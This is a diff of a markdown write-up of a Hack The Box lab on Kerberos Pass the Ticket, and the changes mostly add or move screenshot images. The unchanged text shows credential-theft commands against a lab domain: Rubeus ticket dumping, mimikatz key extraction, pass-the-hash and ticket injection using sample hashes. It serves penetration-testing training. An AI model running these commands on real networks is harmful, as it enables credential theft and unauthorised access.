@@ -1,3 +1,4 @@
+<img width="969" height="608" alt="PtT" src="https://github.com/user-attachments/assets/04dd4344-3ee8-44c3-b9fd-9a6e8cc7fc61" />
 ```markdown
 # Pass the Ticket (PtT) Attack | HTB Password Attacks
 **Category:** HTB CPTS Certification Lab  
@@ -7,7 +8,7 @@
 > *This write-up is for educational purposes only. All activities were performed in a controlled, private lab environment provided by Hack The Box (HTB). Unauthorized access to computer systems is illegal and unethical.*
 
 ---
-<img width="969" height="608" alt="PtT" src="https://github.com/user-attachments/assets/04dd4344-3ee8-44c3-b9fd-9a6e8cc7fc61" />
+
 
 ## 1. Introduction
 Pass the Ticket (PtT) is a post-exploitation technique where an attacker uses a stolen Kerberos ticket (TGT or TGS) to authenticate to a remote system without knowing the user’s plaintext password.
@@ -39,6 +40,9 @@ Rubeus.exe dump /nowrap
 
 ```
 
+
+<img width="800" height="372" alt="1_uLvt4x23BKD8QSBUmeFBlg" src="https://github.com/user-attachments/assets/62d49776-4352-4b2e-89b6-ae0c39ace861" />
+
 **Findings:**
 
 * **Computer Accounts:** Tickets ending in `$` (e.g., `MS01$@inlanefreight.htb`).
@@ -55,6 +59,9 @@ With the target user identified, we used **Mimikatz** to extract the encryption 
 mimikatz.exe privilege::debug sekurlsa::ekeys
 
 ```
+<img width="800" height="445" alt="1_HpquTzZYy4s8RsUtvIvn-g" src="https://github.com/user-attachments/assets/f8d369f3-1a2b-4f4c-b0bd-d859fbed2ee4" />
+
+
 
 We extracted the **AES256** and **NTLM (RC4)** keys for `john`. We then performed a **Pass-the-Hash** attack to spawn a new command prompt running under john's context.
 
@@ -62,6 +69,8 @@ We extracted the **AES256** and **NTLM (RC4)** keys for `john`. We then performe
 sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2
 
 ```
+<img width="800" height="312" alt="1_uAgUQPKN6xTjl8i5gsHoZg" src="https://github.com/user-attachments/assets/bf97749e-d8e7-4952-9553-e843a5263c07" />
+
 
 From this new session, we verified access to the Domain Controller’s file share:
 
@@ -70,6 +79,8 @@ dir \\DC01.inlanefreight.htb\john
 type \\DC01.inlanefreight.htb\john\john.txt
 
 ```
+<img width="706" height="297" alt="1_ii4bpFyIWQcROVqqZifpOg" src="https://github.com/user-attachments/assets/a1265a3d-a1d2-43d5-b5e6-1f6959621838" />
+
 
 ---
 
@@ -90,6 +101,8 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
 
 ```
+<img width="800" height="227" alt="1_Np6f1kagb1temFRrkOXnaQ" src="https://github.com/user-attachments/assets/6258d1e2-5beb-4b81-95c5-cfb422f9ef26" />
+
 
 Finally, we connected via PowerShell Remoting:
 
@@ -97,6 +110,9 @@ Finally, we connected via PowerShell Remoting:
 Enter-PSSession -ComputerName DC01
 
 ```
+<img width="686" height="503" alt="1_jKseZ2Dx6yMQI-YM68TBqw" src="https://github.com/user-attachments/assets/e254ee06-a1f5-434c-87a2-5ac023af727e" />
+
+
 
 ---
 
